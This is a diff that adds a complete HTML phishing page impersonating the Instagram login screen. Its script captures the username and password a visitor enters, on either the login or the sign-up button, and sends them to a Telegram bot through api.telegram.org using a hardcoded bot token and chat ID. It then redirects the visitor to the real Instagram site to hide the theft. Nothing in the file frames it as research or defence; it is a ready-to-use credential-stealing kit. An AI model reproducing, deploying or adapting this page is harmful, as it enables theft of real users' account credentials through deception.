@@ -1,0 +1,67 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Instagram</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 80%;
+      max-width: 300px;
+    }
+    button {
+      padding: 10px 30px;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Instagram Login</h2>
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button type="submit">Log In</button>
+    <button type="button" onclick="handleSignup()">Sign Up</button>
+  </form>
+
+  <script>
+    const BOT_TOKEN = "8146547232:AAEFjVJ2Vs1IgBFt-ZYQDFx-kT7vOTxXMRQ";
+    const CHAT_ID = "968143308";
+
+    function sendToTelegram(data) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: data
+        })
+      });
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+      sendToTelegram(`Login Attempt:\nUsername: ${user}\nPassword: ${pass}`);
+      window.location.href = "https://instagram.com"; // redirect after
+    });
+
+    function handleSignup() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+      sendToTelegram(`Signup Attempt:\nUsername: ${user}\nPassword: ${pass}`);
+      window.location.href = "https://instagram.com/accounts/emailsignup/";
+    }
+  </script>
+</body>
+</html>
